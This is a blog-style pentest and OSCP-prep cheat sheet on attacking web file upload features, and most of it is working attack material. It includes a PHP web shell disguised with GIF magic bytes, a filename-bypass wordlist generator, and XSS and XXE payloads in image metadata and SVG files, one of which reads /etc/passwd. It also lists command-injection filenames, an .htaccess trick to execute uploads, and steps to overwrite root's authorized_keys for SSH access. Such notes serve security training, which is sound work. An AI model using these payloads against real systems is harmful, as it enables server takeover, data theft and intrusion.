---
title: "Exploting File Upload Functionality"
date: 2025-08-15
categories: ["CTF", "OSCP Prep", "Web"]
tags: ["Web Attacks", "File Upload", "PHP", "FUFF", "seclists"]
description: "Techniques with guides on how to exploit file uplaod functionality on web applications"
---

Checklist:
What framework are we traying to attack.
Check where the validation happens (front-end or back-end).
Can we bypass blacklist extension filters via capitalization or is there any other extension we can uplaod.
Check for the acceptance of double extensions on uploaded files.
Can we inject special characters (e.i, %00) null byte inejection on filename.
Can we bypass file type restrictions by forging valid magic bytes.
If supported by the webserver, can you upload .htaccess files


## Identify Web Framework/Programming Language

First we need to know what kind of technology we are dealing with.
What Programming language is the webapplication using.
Or what framework.

```bash
# We can use multuple file extensions to determine what kind of framework we are against
sudo ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://doman.com/indexFUZZ
```

> Resources: [seclists-web-extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)



## Disabling Front-end Validation

We can use the browser dev tools `inspector` to see if the file validation happens in the front-end or back-end. 
If the checks happens in front-end we can attempt to disable it by editting the HTML and altering it or remove it completeley

```bash
## Modify the HTML through Inspector (Firefox Dev tools)
We can find the functionality that checks for the file that is beeing uploaded and modify it or totally remove it.
```
![Image Description](/images/notes-file-upload1.png)

![Image Description](/images/notes-file-upload2.png)

---

## Blacklist Extension Filters

Most of the times there is a kind of restrictions in terms of what kind of files/file types are allowed to be uploaded.
If those restrictions are using blackilist maybe we can bypass it.
Or find alternative file types that we can utilize maliciously.

`We can use Burp+Intruder to FUZZ the upload functionality against all the file-extentions and find out according to length of the response if we can bypass the validation or not.`

> REMEMBER: When Using Burp UNTICK the URL encoding

![Image Description](/images/notes-file-upload3.png)

We can also use `ffuf` to achieve the same results.

```bash
## Fuzzing extensions (using ffuf)

ffuf -X POST -request upload.txt -request-proto "http" -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt
```

> Resources: 
[seclists-web-extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) 
[PHP-extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
[.NET/ASP-extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)


## Capitalization
Capitlization can also trick the validation if is not implemented correct and successfully bypass it.
We can also try to change some of the extensions characters to capitals and small: `pHP` `PhPs` etc...

---

## Double Extensions (Whitelist Bypasses)

We can also attempt to use double extensions to bypass whitelist, sometimes misconfigured web application check only the first iteration and do not process the second one.

Examples: `jpg.php` `png.php` etc.

---

## Character Injection

We can inject several characters before or after the final extension to cause the web application to misinterpret the filename and execute the uploaded file as a PHP script.

```bash
%20
%0a
%00
%0d0a
/
.\
.
…
:
```

We could also use reverse extension. 
Here is an automated way to create such a list.

## Reverse Extension  (Custom bash script)
```bash
## NOTE
shell.php%00.jpg (works on Linux+PHP server version 5.x and earlier)

shell.aspx:jpg (works on Windows+ASP)

The following bash script generates all permutations of a file name before and after both the PHP and JPG extnsions

for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
	for ext in '.php' '.phps' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht'  '.phar' '.phpt' '.pgif' '.phtml' '.phtm'; do
        echo "original$char$ext.jpg" >> wordlist.txt
        echo "original$ext$char.jpg" >> wordlist.txt
        echo "original.jpg$char$ext" >> wordlist.txt
        echo "original.jpg$ext$char" >> wordlist.txt
    done
done

```


---


## Crafting Malicious Image (Magic Bytes) && MIME-Type Validation Bypass

This is usually done by inspecting the first few bytes of the file's content, which contain the `File Signatur` or `Magic Bytes`

Including `magic bytes` in the beggining of the file.
Below there are 2 examples of a GIF and a ZIP.

```bash
# GIF
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
http://<SERVER_IP>:<PORT>/index.php?language=./images/shell.gif&cmd=id

# Zip
# Works only on PHP if the zip wrapper is enabled
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

---


## Filter Types

There are TWO common methods for validating the file content:

`Content-Type Header` or `File Content`

> Assume we get an error message *Only images are allowed* and we upload shell.jpg and we get blocked this means that the file contents is beeing checked.
[Content-Type Wordlists](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)


---


## Limited File Uploads

Certain file types, like`SVG`,`HTML`,`XML`, and even some image and document files, may allow us to introduce new vulnerabilities to the web application by uploading malicious versions of these files.

#### XSS
```bash
## When a web application allows us to upload `HTML` files. Although HTML files won't allow us to execute code (e.g., PHP), it would still be possible to implement JavaScript code.

## Another example of XSS attacks is web applications that display an image's metadata after its upload. For such web applications, we can include an XSS payload in one of the Metadata parameters that accept raw text, like the `Comment` or `Artist` parameters, as follows:

sudo exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' dotpirate.jpg
sudo exiftool dotpirate.jpg

## When the image's metadata is displayed, the XSS payload should be triggered, and the JavaScript code will be executed to carry the XSS attack.

## SVG (Scalable Vector Graphics) images are XML-based. For this reason, we can modify their XML data to include an XSS payload. For example we can write the following to dotpirate.svg:
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

#### XXE
```bash
## The following example can be used for an SVG image that leaks the content of (`/etc/passwd`):
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

```bash
## To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

## Injections in File Names

```bash
## IF the uploaded file name is displayed (i.e., reflected) on the page. We can try injecting a command in the file name, and if the web application uses the file name within an OS command, it may lead to a command injection attack.

file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami
file<script>alert(window.origin);</script>
file';select+sleep(5);--.jpg
```

## Windows-specific Attacks

```bash
## One such attack is using reserved characters, such as (`|`, `<`, `>`, `*`, or `?`), which are usually reserved for special uses like wildcards.

## Finally, we may utilize the Windows [8.3 Filename Convention](https://en.wikipedia.org/wiki/8.3_filename) to overwrite existing files or refer to files that do not exist.

For example, to refer to a file called (`dorpitate.txt`) we can use (`HAC~1.TXT`) or (`HAC~2.TXT`), where the digit represents the order of the matching files that start with (`HAC`)


```


## Directory Traversal on Upload

![[Directory Traversal on File Upload.png]]

```bash
We can upload a file and change the file name to jump directories and save the file at the root directory.

If we can overwrite files we couls try overwritting the authorized_keys file in the home directory of root. If this file contains the public key of a private key we control we can access the system via SSH as the root user. 

Execution:

sudo ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in fileup
Your public key has been saved in fileup.pub


sudo cat fileup.pub > authorized_keys

Now that the file contains our public key we can upload it to the target and overwrite their authorized_keys.

```

![[Overwritting authorized keys.png]]

```bash
rm ~/.ssh/known_hosts

sudo ssh -i fileup root@mountaindesserts.com
```

## .htaccess and webservers that support it

| Web Server        | `.htaccess` Support | Notes                                                                |
| ----------------- | ------------------- | -------------------------------------------------------------------- |
| **Apache**        | ✅ Yes               | Must have `AllowOverride` enabled in `httpd.conf` or `apache2.conf`. |
| **LiteSpeed**     | ✅ Yes               | Fully supports `.htaccess` (Apache-compatible).                      |
| **OpenLiteSpeed** | ⚠️ Partial          | Reads `.htaccess` only if configured to load Apache rules.           |
| **Nginx**         | ❌ No                | Does not support `.htaccess` — configs are in `nginx.conf`.          |
| **Caddy**         | ❌ No                | Uses its own configuration syntax.                                   |
| **IIS**           | ❌ No                | Uses `web.config` instead.                                           |


If the upload functionality of a web application saves the files in root `/` then we can try to upload an `.htaccess` file allowing our own extensions to be uploaded

```bash
cat .htaccess

AddType application/x-httpd-php .dotpirate

# Now we can upload a file as shell.dotpirate and it will be processed as a PHP file
```

